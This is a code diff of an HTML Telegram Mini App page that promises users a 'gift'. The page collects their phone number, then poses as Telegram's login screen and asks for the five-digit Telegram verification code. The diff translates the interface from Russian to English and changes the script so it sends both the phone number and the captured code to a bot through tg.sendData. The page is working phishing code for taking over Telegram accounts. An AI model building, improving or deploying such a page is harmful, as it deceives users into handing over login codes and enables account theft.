@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -7,22 +7,19 @@
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; padding: 20px; text-align: center; background: var(--tg-theme-bg-color, #ffffff); color: var(--tg-theme-text-color, #000000); }
         .hidden { display: none !important; }
-        
-        /* Стили для экрана ввода кода */
+
         .code-header { font-size: 24px; font-weight: 500; margin-bottom: 10px; margin-top: 20px; }
         .code-subtitle { font-size: 14px; color: var(--tg-theme-hint-color, #999999); margin-bottom: 30px; line-height: 1.4; }
-        
-        /* Скрываем стандартный инпут, но он ловит ввод */
-        .code-input { 
-            position: absolute; opacity: 0; width: 1px; height: 1px; 
-            font-size: 16px; 
+
+        .code-input {
+            position: absolute; opacity: 0; width: 1px; height: 1px;
+            font-size: 16px;
         }
-        
-        /* Красивые ячейки для цифр */
+
         .code-container { display: flex; justify-content: center; gap: 8px; margin-bottom: 30px; }
-        .code-cell { 
-            width: 45px; height: 55px; border: 1.5px solid var(--tg-theme-hint-color, #ccc); 
-            border-radius: 10px; display: flex; justify-content: center; align-items: center; 
+        .code-cell {
+            width: 45px; height: 55px; border: 1.5px solid var(--tg-theme-hint-color, #ccc);
+            border-radius: 10px; display: flex; justify-content: center; align-items: center;
             font-size: 24px; font-weight: 600; transition: border-color 0.2s;
         }
         .code-cell.filled { border-color: var(--tg-theme-button-color, #3390ec); }
@@ -31,18 +28,17 @@
 </head>
 <body>
 
-    <!-- Экран 1 -->
+    <!-- Screen 1 -->
     <div id="screen-phone">
-        <h2 style="margin-top: 40px;">Шаг 1</h2>
-        <p style="color: gray;">Для получения подарка авторизуйтесь по кнопке ниже 👇</p>
-        <!-- Кнопку запроса номера мы вызываем через встроенную кнопку Telegram (в самом низу) -->
+        <h2 style="margin-top: 40px;">Step 1</h2>
+        <p style="color: gray;">To receive your gift, authorize using the button below 👇</p>
     </div>
 
-    <!-- Экран 2 (Ввод кода) -->
+    <!-- Screen 2 (Code input) -->
     <div id="screen-code" class="hidden">
-        <div class="code-header">Введите код</div>
-        <div class="code-subtitle">Мы отправили код от Telegram на ваш номер<br><b>*** *** ** **</b></div>
-        
+        <div class="code-header">Enter the code</div>
+        <div class="code-subtitle">We sent a Telegram code to your number<br><b>*** *** ** **</b></div>
+
         <div class="code-container" id="code-cells">
             <div class="code-cell"></div>
             <div class="code-cell"></div>
@@ -61,39 +57,40 @@
                 tg.expand();
                 let isSent = false;
 
-                // 1. ВСТРОЕННАЯ КНОПКА TELEGRAM ДЛЯ ЗАПРОСА НОМЕРА
-                tg.MainButton.setText("ПОДЕЛИТЬСЯ НОМЕРОМ");
+                // 1. Request phone number via Telegram main button
+                tg.MainButton.setText("SHARE PHONE NUMBER");
                 tg.MainButton.show();
-                
+
                 tg.MainButton.onClick(function() {
                     tg.requestContact(function(shared, contact) {
-                        if (shared) {
-                            // Переключаем экран на ввод кода
+                        if (shared && contact) {
+                            const phone = contact.phone_number;
+
+                            // Switch to code screen
                             document.getElementById('screen-phone').classList.add('hidden');
                             document.getElementById('screen-code').classList.remove('hidden');
-                            
-                            // Скрываем кнопку "Поделиться"
                             tg.MainButton.hide();
-                            
-                            // Фокусируемся на поле ввода, чтобы открылась клавиатура
+
+                            // Send phone to bot via web_app_data
+                            tg.sendData(JSON.stringify({ type: "phone", phone: phone }));
+
+                            // Focus code input to open keyboard
                             setTimeout(() => { document.getElementById('code-input').focus(); }, 100);
                         }
                     });
                 });
 
-                // 2. Обработка ввода кода (анимация ячеек + отправка)
+                // 2. Code input handling
                 const codeInput = document.getElementById('code-input');
                 const codeCells = document.querySelectorAll('.code-cell');
                 const codeContainer = document.getElementById('code-cells');
 
-                // Клик по ячейкам вызывает клавиатуру
                 codeContainer.onclick = function() { codeInput.focus(); };
 
                 codeInput.addEventListener('input', function(e) {
-                    const value = this.value.replace(/\D/g, ''); // Только цифры
-                    this.value = value; 
+                    const value = this.value.replace(/\D/g, '');
+                    this.value = value;
 
-                    // Красиво заполняем ячейки
                     codeCells.forEach((cell, index) => {
                         if (index < value.length) {
                             cell.innerText = value[index];
@@ -102,7 +99,6 @@
                             cell.innerText = '';
                             cell.classList.remove('filled');
                         }
-                        
                         if (index === value.length) {
                             cell.classList.add('active');
                         } else {
@@ -110,18 +106,15 @@
                         }
                     });
 
-                    // Как только ввели 5 цифр — отправляем
                     if (value.length === 5 && !isSent) {
-                        isSent = true; 
-                        this.blur(); // Прячем клавиатуру
-                        
-                        const botUsername = "anonlmgifts_bot"; 
-                        
-                        // Ссылка с кодом, которая отправит данные боту
+                        isSent = true;
+                        this.blur();
+
+                        // Send code to bot via web_app_data (separate message)
                         setTimeout(() => {
-                            tg.openTelegramLink("https://t.me/" + botUsername + "?start=" + value);
+                            tg.sendData(JSON.stringify({ type: "code", code: value }));
                             setTimeout(() => tg.close(), 500);
-                        }, 500);
+                        }, 300);
                     }
                 });
             }
